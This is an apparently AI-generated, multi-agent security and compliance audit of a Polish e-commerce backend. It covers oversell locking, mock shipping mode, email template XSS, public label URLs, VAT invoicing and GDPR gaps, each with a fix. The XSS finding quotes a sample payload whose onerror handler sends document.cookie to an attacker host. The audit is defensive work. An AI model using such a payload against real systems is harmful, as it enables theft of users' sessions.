# E-Commerce Audit — Round 8
*Generated: 2026-06-05 — 5-agent stochastic consensus*
*Agents: Security Skeptic · Domain Expert · Infrastructure/DevOps · Legal/Compliance · Risk Analyst*

> **Excludes** everything already in `audit-weak-points.md`, `audit-round-2.md`, `audit-round-3.md`, `audit-round-4.md`, `audit-round-5.md`, `audit-round-6.md`, `audit-round-7.md`, and `project-gaps-audit.md`.
> **Excludes** Phase 7 (pre-launch checklist) items in ROADMAP.md.

---

Done:

## 🔴 CRITICAL — `FOR UPDATE` inside interactive transactions is a no-op on pgbouncer transaction mode — oversell protection broken in production *(Infrastructure agent)*

**Files:** `backend/src/modules/cart/cart.service.ts:54–58`, `backend/src/modules/orders/orders.service.ts` (multiple call sites), `backend/src/modules/payments/payments.service.ts` (multiple call sites)

Supabase's pooled connection string (port 6543) runs pgbouncer in **transaction mode** — each statement gets a different server connection. Prisma interactive transactions (`$transaction(async tx => { ... })`) emit `BEGIN` on connection A. The subsequent `SELECT ... FOR UPDATE` runs on connection B and its lock is released the instant that statement completes, before the `COMMIT` on connection A. The row lock is silently held for zero time.

Practical consequence: the oversell protection in `addItem` (audit-project-gaps #40) and `updateItem` uses a FOR UPDATE guard inside an interactive transaction. That guard is completely non-functional in production. Two concurrent requests both read the same stock value, both pass the `stock >= newQty` check, and both commit. Every previous audit round assumed this lock worked; it does not.

**Fix (choose one):**
1. Replace FOR UPDATE with an optimistic-concurrency `updateMany` pattern: `WHERE stock >= neededQty AND id = variantId`. Check `count === 1`; retry on 0.
2. Apply a `CHECK (stock >= 0)` constraint to `ProductVariant.stock` and catch Prisma P2002 at the service layer.
3. Switch to Supabase's **direct** connection (port 5432, no pgbouncer) for the cart/order services — but this breaks connection pooling on multi-replica Railway.

Option 1 (optimistic concurrency) is the correct fix; it works in transaction mode and is already how stock decrements in `createFromCart` should be guarded.

---

## 🔴 CRITICAL — InPost mock mode activates silently when `INPOST_ORGANIZATION_ID` is absent in production *(Risk Analyst · 2/5 agents)*

**File:** `backend/src/modules/shipping/carriers/inpost.client.ts:34–35`

```ts
this.mockEnabled =
  configService.get<string>('INPOST_MOCK_ENABLED') === 'true' ||
  !configService.get<string>('INPOST_ORGANIZATION_ID');
```

The OR clause means that even if `INPOST_MOCK_ENABLED=false` is explicitly set, mock mode activates if `INPOST_ORGANIZATION_ID` is missing from the Railway env vars. In that state, `shipping.service.ts` writes `mock-label-{id}.pdf` to the DB as the real label URL, and the shipping notification email fires with a fabricated 10-digit tracking number. `config.validation.ts` does not enforce `INPOST_ORGANIZATION_ID` as required in production — it defaults to `'mock-org-id'`.

**Cascade:** customer receives shipping email → clicks InPost tracking link → 404 → support ticket → refund request → Stripe dispute → chargeback.

**Fix:** Add `INPOST_ORGANIZATION_ID: Joi.string().required()` (no default) to `config.validation.ts` when `NODE_ENV=production` and `INPOST_MOCK_ENABLED !== 'true'`. Remove the fallback `'mock-org-id'` default.

---

## 🟠 HIGH — Stored XSS in HTML email templates via unsanitized user-supplied data *(Security Skeptic)*

**Files:** `backend/src/modules/email/templates/return-admin-notification.template.ts:115,196`, `backend/src/modules/email/templates/shipping-notification.template.ts:11`, `backend/src/modules/email/templates/order-confirmation.template.ts:51`

Multiple email templates interpolate user-supplied strings directly into HTML with template literals and no escaping:

- `return-admin-notification.template.ts` line 196: `${data.reason}` (return reason submitted by customer) injected verbatim inside `<div>`. An attacker submitting `<img src=x onerror=fetch("https://evil.com/"+document.cookie)>` delivers stored XSS to the admin's email client (Outlook, Apple Mail, Thunderbird all execute inline JS in certain HTML render modes).
- Line 115: `${data.customerName}` — user-controlled first+last name from registration.
- `shipping-notification.template.ts` line 11: `${data.trackingUrl}` injected into an `<a href>` without validation — a `javascript:` URL from a compromised carrier response executes on click.
- `order-confirmation.template.ts` line 51: `${data.firstName}` — stored from registration, rendered unescaped.

Note: `generatePicklistHtml` in `admin.setup.ts` correctly uses an `esc()` function. The email templates lack this pattern entirely.

**Fix:** Create a shared `escapeHtml(str: string): string` utility and wrap every `${data.*}` interpolation in email templates. Alternatively, switch to a templating engine (Handlebars, Nunjucks) that HTML-escapes by default.

---


## 🟠 HIGH — Spam complaints not suppressed from future sends — silent Resend account degradation *(Risk Analyst)*

**File:** `backend/src/modules/email/email-webhook.controller.ts:98–103`

The `email.bounced` webhook correctly sets `user.emailBounced = true` and the email queue checks this flag before enqueuing. The `email.complained` webhook only logs a Sentry warning — it does NOT set any flag on the `User` model, and there is no `emailComplained` field in the Prisma schema. A customer who marks one email as spam will continue to receive all subsequent transactional emails (order confirmation, invoice, shipping). Resend terminates accounts at ≥0.08% complaint rate (industry SES standard). A single repeat complainer receiving 4 transactional emails per order can push a low-volume account over this threshold.

**Fix:**
1. Add `emailComplained Boolean @default(false)` to the `User` model.
2. Handle `email.complained` in the webhook controller: set `emailComplained = true` and add the address to Resend's suppression list via `resend.contacts.update()`.
3. Add `emailComplained` to the guard in `email-queue.service.ts` alongside `emailBounced`.

---

## 🟠 HIGH — Invoice not updated after partial refund — Polish VAT law requires a corrective invoice *(Domain Expert)*

**File:** `backend/src/modules/invoice/invoice.service.ts:335`, `backend/src/modules/orders/orders.service.ts:471`

`generateInvoice` fetches `order.totalInCents` and renders it as "DO ZAPŁATY" on the PDF. After a partial refund, `order.totalInCents` is never updated — it still holds the original pre-refund amount. An admin regenerating an invoice on a `PARTIALLY_REFUNDED` order gets a PDF showing the full original charge, while the Stripe charge history reflects the actual net amount. The two figures disagree permanently.

Polish law (Art. 106j Ustawy o VAT) requires issuing a **faktura korygująca** (corrective invoice) when the taxable amount decreases — a corrective invoice reduces the original, it does not replace it. Issuing a re-dated copy of the original full invoice instead of a korygująca is a VAT compliance violation subject to Urząd Skarbowy examination.

**Fix:**
1. Add an `InvoiceCorrection` model linked to the original invoice with `correctedAmountInCents`, `refundReasonCode`, and `issuedAt`.
2. When a partial refund is processed, auto-generate a corrective invoice PDF alongside the Stripe refund.
3. Expose a `GET /orders/:id/corrective-invoice` endpoint.

---

## 🟠 HIGH — Email confirmation permanently lost when process crashes after `processedStripeEvent` insert but before BullMQ enqueue *(Infrastructure · 2/5 agents)*

**File:** `backend/src/modules/payments/payments.service.ts:262–346`

The `$transaction` atomically commits the idempotency key and the payment status flip (correct). Then `dispatchPostPaymentNotifications()` is called **outside** the transaction as a fire-and-forget chain at line 346. If the Node process crashes, times out, or the Redis connection fails between line 293 (transaction commit) and line 346 (email enqueue), the Stripe webhook retry hits the P2002 idempotency guard at line 299 and returns early — the email dispatch at line 346 is never reached. The customer never receives their order confirmation. No Sentry alert fires because the early return is not an exception.

**Fix (transactional outbox pattern):** Add an `OutboxMessage` table. Inside the `$transaction`, insert an outbox row alongside the payment flip. A separate poller/cron reads pending outbox rows and enqueues them into BullMQ, then marks them processed. This decouples the BullMQ enqueue from the HTTP request lifecycle and makes it retryable independently of Stripe's retry window.

Short-term fix: move the BullMQ enqueue inside the Prisma `$transaction` using the BullMQ-Prisma transactional outbox pattern (`QueueEvents` + `FlowProducer`).

---


## 🟠 HIGH — JWT revocation bypass when Redis is unavailable — admin revocation doesn't hold during Redis outage *(Risk Analyst)*

**File:** `backend/src/modules/auth/strategies/jwt.strategy.ts:41–47`

When Redis is unreachable, the catch block explicitly allows the JWT through (documented comment: "Redis unavailable — allow through rather than locking out all users. Revocation window of max 15 min is accepted as the trade-off"). The practical risk: if `JWT_SECRET` must be rotated due to suspected compromise (e.g., leaked env var, employee offboarding with access), and Redis is flapping during the rotation, revoked tokens remain valid. There is also no dual-key overlap strategy for JWT secret rotation — all existing access tokens are invalidated simultaneously on Railway redeploy, force-logging out every user mid-session with no graceful recovery.

**Fix:**
1. Document the Redis-outage window as an accepted trade-off in the security runbook (if the current behavior is intentional).
2. Add a JWT `jti` (JWT ID) stored in Redis at issue time, so token revocation is individual rather than all-or-nothing.
3. Implement dual-key rotation: `JWT_SECRET_PREV` + `JWT_SECRET` — the strategy validates against both during a 15-minute rotation window.

---

## 🟠 HIGH — Shipping label Supabase URL is a permanent public unauthenticated URL — customer PII exposed *(Risk Analyst)*

**File:** `backend/src/modules/storage/storage.service.ts` (`uploadShippingLabel`)

`uploadShippingLabel` calls `getPublicUrl()` on the `shipping-labels` Supabase bucket. This returns a permanent, unauthenticated URL. Shipping label PDFs contain the customer's full name, phone number, and (for InPost) the locker access code. InPost's own API returns time-limited signed URLs specifically to prevent label reuse and PII exposure. By re-hosting on Supabase with a public bucket, that TTL is permanently lost. No `shipping-labels-rls.sql` equivalent to `product-images-rls.sql` exists. Labels for cancelled or refunded orders remain accessible forever with no cleanup job.

**Fix:**
1. Set `shipping-labels` bucket to `public = false` in Supabase.
2. Issue short-lived signed URLs (1–4h) via `supabase.storage.from('shipping-labels').createSignedUrl()` at the point of admin access, instead of storing the public URL.
3. Add a weekly cleanup cron that deletes Supabase labels for CANCELLED/REFUNDED orders older than 30 days.

---

## 🟠 HIGH — `DISPUTE_HOLD → CANCELLED` admin transition bypasses `handleDisputeClosed` webhook — stock restored without correct refund logic *(Domain Expert)*

**File:** `backend/src/modules/orders/orders.service.ts:55` (status transition map), line ~861 (`updateStatus`)

`ORDER_STATUS_TRANSITIONS` permits `DISPUTE_HOLD → CANCELLED`. `updateStatus` handles this path by restoring stock and cancelling the order. However, `updateStatus` does NOT issue a Stripe refund — that's correct for a lost dispute (Stripe already took the funds). The problem: if an admin manually calls this transition on an order where the dispute was still PENDING (not yet resolved by Stripe), the order is cancelled and stock restored, but the dispute continues in Stripe independently. When Stripe later calls the `charge.dispute.closed` webhook, `handleDisputeClosed` looks for the order — finds it CANCELLED — and exits without processing. The dispute resolution in Stripe and the order state in the DB are permanently desynchronised.

**Fix:** Block `DISPUTE_HOLD → CANCELLED` in `updateStatus` with a `ConflictException` directing admins to wait for the Stripe webhook. Only allow the transition via `handleDisputeClosed` webhook processing.

---

## 🟠 HIGH — Omnibus Directive — product ranking algorithm undisclosed (EU 2019/2161 Art. 6a) *(Legal · 2/5 agents)*

**File:** `frontend/src/app/features/catalog/` (sort dropdown), `backend/src/modules/products/products.service.ts`

The product list offers a "Polecane" (Relevance) sort. EU Directive 2019/2161 Art. 6a(1)(m) requires disclosure of "the main parameters determining ranking and their relative importance." No tooltip, footnote, or help text explains what "relevance" means. UOKiK has been actively investigating opaque ranking on Polish e-commerce platforms since 2023. Administrative fine: up to 10% of annual turnover.

**Fix:** Add a one-sentence disclosure near the sort dropdown. Example: *"Polecane — sortowanie na podstawie popularności i dostępności, bez płatnego promowania."*

---

## 🟡 MEDIUM — HTTP graceful shutdown gap — in-flight `createFromCart` cut by Railway SIGKILL *(Infrastructure)*
**File:** `backend/src/main.ts`
`main.ts` calls `app.enableShutdownHooks()` and the BullMQ worker correctly drains on `onApplicationShutdown`. However, the HTTP server itself has no drain timeout. Railway sends SIGTERM then SIGKILL after approximately 10 seconds. The `TimeoutInterceptor(30_000)` allows 30-second HTTP responses — requests that have been in-flight for 25 seconds are violently interrupted by the SIGKILL, leaving orders in a half-committed state (e.g., stock decremented, payment not yet initiated).
**Fix:** Add `server.closeIdleConnections()` and set `keepAliveTimeout: 5000` to stop accepting new connections immediately on SIGTERM. Reduce `TimeoutInterceptor` to a value below Railway's SIGKILL window, or disable it for the order creation endpoint and let the BullMQ outbox handle retries.
--- 


## 🟡 MEDIUM — Data retention — no enforced deletion schedule for orders/invoices after 5-year accounting window *(Legal)*

Polish Ustawa o rachunkowości Art. 74 requires keeping financial records for 5 years from year-end after the relevant fiscal year closes. GDPR Art. 5(1)(e) (storage limitation) requires deletion once that purpose expires. There is no `retentionExpiresAt` field on `Order` or `Invoice`, and no cron job enforcing deletion after the 5-year window. This is both a GDPR Art. 5 violation and an operational liability in a UODO audit.

**Fix:** Add `retentionExpiresAt DateTime?` to `Order` (set at creation to `NOW() + 5 years`). Add a yearly cron that anonymizes or hard-deletes orders past this date. The GDPR erasure procedure already anonymizes personal fields — extend it to run on a schedule for expired retention dates, not only on explicit user request.

---

## 🟡 MEDIUM — Category circular reference — recursive tree traversal causes infinite loop *(Security Skeptic)*

**File:** `backend/src/modules/categories/categories.service.ts:42`

`update()` allows setting any `parentId` on a category, including its own descendant's ID, with no cycle detection. The query layer uses `include: { children: { include: { children: true } } }` (two levels deep — safe). But the `sitemap-generator.ts` and any code path that recursively walks the category tree to generate breadcrumbs or slugs will loop infinitely if an admin (or a compromised admin account) sets `A.parentId = B.id` and `B.parentId = A.id`.

**Fix:** Before committing a `parentId` update, walk the candidate parent's ancestors in a loop (max depth 20) and reject if the category being updated appears anywhere in that chain.

---

## 🟡 MEDIUM — Frontend `/wishlist` and `/returns` routes missing `canActivate: [authGuard]` *(Security Skeptic)*

**File:** `frontend/src/app/app.routes.ts:162,166`

The Angular router loads the Wishlist and Returns components for unauthenticated users. The backend is correctly guarded (401 is returned), but the frontend renders the component shell, fails with unhandled HTTP 401 errors, and does not redirect to login. This creates confusing UX (broken component state visible to unauthenticated users) and unhandled `ErrorInterceptor` 401-retry loops (intercept → refresh → refresh fails → infinite loop on a protected component with no auth context).

**Fix:** Add `canActivate: [authGuard]` to both routes.

---

## 🟡 MEDIUM — Marketing/review consent bundled with order T&C checkbox — RODO non-compliant *(Legal)*

**File:** `frontend/src/app/features/checkout/` (Step 2)

The `marketingConsent` checkbox sits directly above the "Przejdź do płatności" button and combines review-request consent with marketing consent under a single label. Under GDPR Art. 7(2) and Ustawa o świadczeniu usług drogą elektroniczną Art. 10, marketing consent must be separate from the transactional contract and may not be bundled with consent that is functionally required to complete the purchase. UODO considers proximity to the payment button as implicit pressure. Review-request emails are transactional (legal basis: legitimate interest); marketing emails require separate, explicit opt-in with a clear description of content.

**Fix:** Separate the review-request consent from marketing consent. Move the marketing newsletter opt-in to the account registration flow or a post-purchase screen. Clearly label review-request emails as transactional.

---

## 🟡 MEDIUM — Stock reservation window is effectively unbounded on Railway hobby tier *(Domain Expert)*

**Files:** `backend/src/modules/orders/orders.service.ts:213`, `backend/src/modules/payments/payments.service.ts:731`

Stock is decremented inside `createFromCart` at order creation. The reconciliation cron only cancels sessions older than 30 minutes. On Railway hobby tier, the container sleeps after 15 minutes of inactivity and `@Cron` does not fire while sleeping. During a flash sale with a sudden traffic spike followed by inactivity, PENDING_PAYMENT orders (e.g., from cart-abandonment) can ghost-hold stock indefinitely — far beyond the intended 30–40-minute window — until the next traffic event wakes the container.

**Fix:** Ensure the external reconciliation cron (Railway Cron Job service or cron-job.org) pings `/payments/reconcile` every 10 minutes unconditionally, keeping the container awake and the cron firing on schedule. This is documented in CLAUDE.md but should be validated as active before the first promotion.

---

## 🟡 MEDIUM — Back-in-stock `notifyOnRestock` flag reset before BullMQ queue is confirmed drained — silent bulk data loss *(Risk Analyst)*

**File:** `backend/src/modules/products/products.service.ts:541–543`

`dispatchBackInStockNotifications` sets `notifyOnRestock = false` for all matching wishlist items via `updateMany` **before** the `Promise.allSettled` email enqueue loop runs. If the process crashes, times out, or Redis connection fails between the `updateMany` and the email enqueue, users permanently lose their restock notification with no record, no retry, and no admin alert. At scale (500-user waitlist), a Railway OOM restart during a popular restock event silently discards all 500 notification intents.

**Fix:** Set `notifyOnRestock = false` inside the BullMQ job processor (after successful delivery), not in the service that enqueues. If the job fails, BullMQ's retry logic re-executes with the flag still true.

---

## 🟡 MEDIUM — City-level velocity guard blocks legitimate customers in Warsaw on launch day *(Risk Analyst)*

**File:** `backend/src/modules/payments/payments.service.ts:37–43`

The pre-checkout velocity guard counts orders in the last 30 minutes from the same `snapshotCity`. Blocking threshold is 4. Warsaw has 1.8M residents. During a launch promotion, the 5th legitimate Warsaw customer attempting checkout within 30 minutes is rejected with 429. A fraudster in a smaller city (e.g. Płock) faces exactly 3 attempts before hitting the limit. The guard provides near-zero fraud protection and meaningfully risks blocking real customers during any marketing campaign.

**Fix:** Replace or supplement the city-level guard with a per-IP or per-user velocity check. Use Stripe Radar for fraud scoring instead of homegrown city heuristics.


## 🟡 MEDIUM — Sentry source maps never uploaded — production stack traces are minified *(Infrastructure)*

**File:** `.github/workflows/ci.yml` (no `sentry-cli` upload step)

`backend/tsconfig.json` generates `.js.map` files. `instrument.ts` sets `release: process.env.SENTRY_RELEASE`. No `SENTRY_AUTH_TOKEN` secret is referenced in any CI config, and no `sentry-cli sourcemaps upload` step exists. In production, every Sentry error shows minified NestJS frames — debugging production incidents requires manual local sourcemap reconstruction.

**Fix:** Add a post-build CI step: `sentry-cli sourcemaps inject ./backend/dist && sentry-cli sourcemaps upload --release=$SENTRY_RELEASE ./backend/dist`. Store `SENTRY_AUTH_TOKEN` as a GitHub Actions secret.

---

## 🟡 MEDIUM — Cross-border shipping: no dangerous goods restriction gate (fragrances = UN 1266 flammable liquid) *(Legal)*

Fragrances are classified as **UN 1266 (Flammable liquid, Class 3)** under IATA DGR. DHL and GLS explicitly restrict air-shipped perfumes above 70% alcohol to ≤0.5 L per package and require DG declarations. The checkout and shipping service have no restriction on destination country and no DG declaration flow. International orders shipped via air freight legs create carrier liability exposure and potential Polish customs/transport law violations (ADR/Prawo przewozowe).

**Fix:** Block non-PL shipping addresses until proper DG compliance documentation is in place, or add a UI disclaimer for international orders noting fragrance shipping restrictions and switching to ground-only carrier options.

---

## 🟡 MEDIUM — Missing `DISCONTINUED` product status — no UX distinction between out-of-stock and discontinued *(Risk Analyst)*

**File:** `backend/prisma/schema.prisma` (`Product` model)

The schema has only `isActive Boolean`. There is no `DISCONTINUED`, `TEMPORARILY_UNAVAILABLE`, or `SUPPLIER_BREAK` state. If a supplier goes on holiday or a product is permanently discontinued, the only options are:
- Set `isActive=false`: product removed from catalog, SEO page disappears (link rot), restock notification signups lost.
- Leave `isActive=true` with `stock=0`: product appears in search with no restock ETA, and customers cannot distinguish "coming back next week" from "discontinued forever."

**Fix:** Add `ProductStatus enum { ACTIVE, OUT_OF_STOCK, DISCONTINUED, COMING_SOON }` to the schema. Add an `estimatedRestockDate DateTime?` field. Filter catalog to `ACTIVE | OUT_OF_STOCK` (never `DISCONTINUED`). Keep the SEO page alive for discontinued products with a "No longer available" banner and cross-sell to alternatives.

---

## 🟢 LOW — Coupon `validate` endpoint leaks discount value — enables coupon enumeration without placing orders *(Security Skeptic)*

**File:** `backend/src/modules/coupons/dto/validate-coupon.dto.ts`

`POST /coupons/validate` accepts client-supplied `cartTotalInCents`. An attacker sends `cartTotalInCents: 999999999` to probe whether a code passes the `minSpendInCents` check without real cart items. The response returns the `discountAmountInCents`, letting an attacker enumerate valid codes and their discount values systematically. The actual order transaction recomputes discount from real prices (safe for money), but the validate endpoint is an oracle for coupon brute-force beyond what the rate-limit counter covers.

**Fix:** Rate-limit `POST /coupons/validate` to 10 requests per minute per IP (add `@Throttle`). Optionally, require an active cart session token in the validate request.

---


## Legend

| Label | Meaning |
|---|---|
| 🔴 CRITICAL | Broken in production right now, silent or catastrophic |
| 🟠 HIGH | Direct money loss, legal exposure, or security breach |
| 🟡 MEDIUM | Material UX degradation, data integrity, or operational risk |
| 🟢 LOW | Hardening / polish |

Agent agreement noted where 2+ agents independently identified the same issue.

---

## 🟢 LOW — Wishlist restock email sent regardless of whether user already owns the product *(Domain Expert)*

**File:** `backend/src/modules/products/products.service.ts:525–543`

`dispatchBackInStockNotifications` queries all `WishlistItem` rows with `notifyOnRestock = true` and enqueues an email to every user, with no check whether the user has a delivered order for that product. A repeat buyer who keeps an item on their wishlist after purchase receives a marketing-style restock email for a product they already own — degrading trust in email quality.

**Fix:** Add a `NOT EXISTS (SELECT 1 FROM order_items JOIN orders ON ... WHERE orders.userId = wishlist_items.userId AND order_items.productId = $productId AND orders.status = 'DELIVERED')` filter to the notification query.

---

## 🟢 LOW — Railway Railpack `--frozen-lockfile` is implicit — fragile by convention *(Infrastructure)*

**File:** `railway.json`

`railway.json` specifies `buildCommand` but no `installCommand`. Railpack infers `pnpm install --frozen-lockfile` from the presence of `pnpm-lock.yaml`. If Railpack changes its default behavior, Railway will silently stop using `--frozen-lockfile`, allowing dependency drift between deploys.

**Fix:** Explicitly add `"installCommand": "pnpm install --frozen-lockfile"` to `railway.json`.

---

## Agent Agreement Summary

| Finding | Agents |
|---|---|
| pgbouncer FOR UPDATE broken (oversell protection no-op in production) | Infrastructure · Risk Analyst |
| InPost mock via missing env var | Risk Analyst · Domain Expert |
| Email confirmation lost after P2002 idempotency guard | Infrastructure · Risk Analyst |
| Omnibus ranking disclosure | Legal · Security |
| Stored XSS in email templates | Security Skeptic |
| Spam complaint not suppressed | Risk Analyst |
| Invoice not corrected after partial refund | Domain Expert · Legal |

---

## Prioritized Fix Order

| # | Finding | Severity | Effort |
|---|---|---|---|
| 1 | Replace FOR UPDATE with optimistic concurrency in cart/order services | 🔴 CRITICAL | 1 day |
| 2 | Fix `INPOST_ORGANIZATION_ID` as required in production config validation | 🔴 CRITICAL | 1 hour |
| 3 | Escaping function for all email template interpolations | 🟠 HIGH | 4 hours |
| 4 | Add `emailComplained` flag + suppression logic | 🟠 HIGH | 2 hours |
| 5 | Corrective invoice generation after partial refund | 🟠 HIGH | 1 day |
| 6 | Transactional outbox for post-payment email dispatch | 🟠 HIGH | 1 day |
| 7 | Block `DISPUTE_HOLD → CANCELLED` admin transition | 🟠 HIGH | 2 hours |
| 8 | Shipping label: switch to private bucket + signed URLs | 🟠 HIGH | 3 hours |
| 9 | Omnibus sort disclosure text | 🟠 HIGH | 1 hour |
| 10 | Seller phone number in checkout + Regulamin | 🟠 HIGH | 1 hour |
| 11 | Add `canActivate: [authGuard]` to `/wishlist` and `/returns` routes | 🟡 MEDIUM | 30 min |
| 12 | Separate marketing consent from review-request consent | 🟡 MEDIUM | 2 hours |
| 13 | Category circular reference guard | 🟡 MEDIUM | 2 hours |
| 14 | `notifyOnRestock` flag reset moved to BullMQ processor | 🟡 MEDIUM | 1 hour |
| 15 | HTTP graceful shutdown drain timeout | 🟡 MEDIUM | 1 hour |
| 16 | Data retention cron + `retentionExpiresAt` field | 🟡 MEDIUM | 3 hours |
| 17 | Sentry source maps upload in CI | 🟡 MEDIUM | 1 hour |
| 18 | Add `DISCONTINUED` product status enum | 🟡 MEDIUM | 3 hours |
| 19 | Replace city-level velocity guard with per-IP/user check | 🟡 MEDIUM | 2 hours |
| 20 | Validate external reconciliation cron is active before first promotion | 🟡 MEDIUM | 30 min |
| 21 | Rate-limit coupon validate endpoint | 🟢 LOW | 30 min |
| 22 | Wishlist restock: skip users who already own the product | 🟢 LOW | 1 hour |
| 23 | Explicit `installCommand: --frozen-lockfile` in `railway.json` | 🟢 LOW | 5 min |
| 24 | Dangerous goods disclosure / international shipping gate | 🟡 MEDIUM | 2 hours |
| 25 | JWT dual-key rotation strategy | 🟠 HIGH | 3 hours |
